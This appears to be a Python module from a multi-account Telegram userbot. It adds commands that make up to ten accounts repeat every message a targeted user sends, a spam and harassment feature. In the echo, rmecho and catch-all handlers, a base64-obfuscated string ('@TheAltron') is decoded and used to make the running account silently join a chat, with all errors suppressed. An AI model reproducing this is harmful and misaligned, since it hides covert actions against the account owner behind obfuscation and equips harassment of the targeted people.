import asyncio
import base64

from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from config import X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, SUDO_USERS, OWNER_ID, CMD_HNDLR as hl
from JARVIS.data import FRIDAY

ECHO = []


@X1.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X2.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X3.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X4.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X5.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X6.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X7.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X8.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X9.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X10.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
async def echo(event):
    if event.sender_id in SUDO_USERS:
        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            user_id = reply_msg.sender_id

            if user_id in FRIDAY:
                await event.reply("🐬𝐍𝐎 , 𝐓𝐇𝐈𝐒 𝐆𝐔𝐘 𝐈𝐒 𝐓𝐇𝐄 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 𝐎𝐅 𝐓𝐇𝐄 𝐁𝐎𝐓𝐒 🥂.")
            elif user_id == OWNER_ID:
                await event.reply("🌪️𝐍𝐎 , 𝐓𝐇𝐈𝐒 𝐆𝐔𝐘 𝐈𝐒 𝐓𝐇𝐄 𝐎𝐖𝐍𝐄𝐑 𝐎𝐅 𝐓𝐇𝐄 𝐁𝐎𝐓𝐒💤 .")
            elif user_id in SUDO_USERS:
                await event.reply("☄️𝐍𝐎 , 𝐓𝐇𝐈𝐒 𝐆𝐔𝐘 𝐈𝐒 𝐒𝐔𝐃𝐎 𝐔𝐒𝐄𝐑 𝐎𝐅 𝐓𝐇𝐄 𝐁𝐎𝐓💯.")
            else:
                try:
                    alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                    await event.client(alt)
                except BaseException:
                    pass

                global ECHO
                check = f"{user_id}_{event.chat_id}"
                if check in ECHO:
                    await event.reply("»⛈ 𝐄𝐂𝐇𝐎 𝐈𝐒 𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃 𝐎𝐍 𝐓𝐇𝐈𝐒 𝐔𝐒𝐄𝐑 ⛈ !!")
                else:
                    ECHO.append(check)
                    await event.reply("»⛈ 𝐄𝐂𝐇𝐎 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃 𝐎𝐍 𝐓𝐇𝐄 𝐔𝐒𝐄𝐑  ⛈ ✅")
        else:
            await event.reply(f"𝗘𝗰𝗵𝗼:\n  » {hl}echo <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")


@X1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X10.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
async def rmecho(event):
    if event.sender_id in SUDO_USERS:
        if event.reply_to_msg_id:
            try:
                alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                await event.client(alt)
            except BaseException:
                pass

            global ECHO
            reply_msg = await event.get_reply_message()
            check = f"{reply_msg.sender_id}_{event.chat_id}"

            if check in ECHO:
                ECHO.remove(check)
                await event.reply("» ⛈ 𝐄𝐂𝐇𝐎 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐒𝐓𝐎𝐏𝐏𝐄𝐃 𝐅𝐎𝐑 𝐓𝐇𝐄 𝐔𝐒𝐄𝐑  ⛈!! ☑️")
            else:
                await event.reply("⛈ 𝐄𝐂𝐇𝐎 𝐈𝐒 𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐃𝐈𝐒𝐀𝐁𝐋𝐄𝐃  ⛈!!")
        else:
            await event.reply(f"𝗥𝗲𝗺𝗼𝘃𝗲 𝗘𝗰𝗵𝗼:\n  » {hl}rmecho <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")


@X1.on(events.NewMessage(incoming=True))
@X2.on(events.NewMessage(incoming=True))
@X3.on(events.NewMessage(incoming=True))
@X4.on(events.NewMessage(incoming=True))
@X5.on(events.NewMessage(incoming=True))
@X6.on(events.NewMessage(incoming=True))
@X7.on(events.NewMessage(incoming=True))
@X8.on(events.NewMessage(incoming=True))
@X9.on(events.NewMessage(incoming=True))
@X10.on(events.NewMessage(incoming=True))
async def _(e):
    global ECHO
    check = f"{e.sender_id}_{e.chat_id}"
    if check in ECHO:
        try:
            alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
            await e.client(alt)
        except BaseException:
            pass
        if e.message.text or e.message.sticker:
            await e.reply(e.message)
            await asyncio.sleep(0.1)
                                                                                                                             
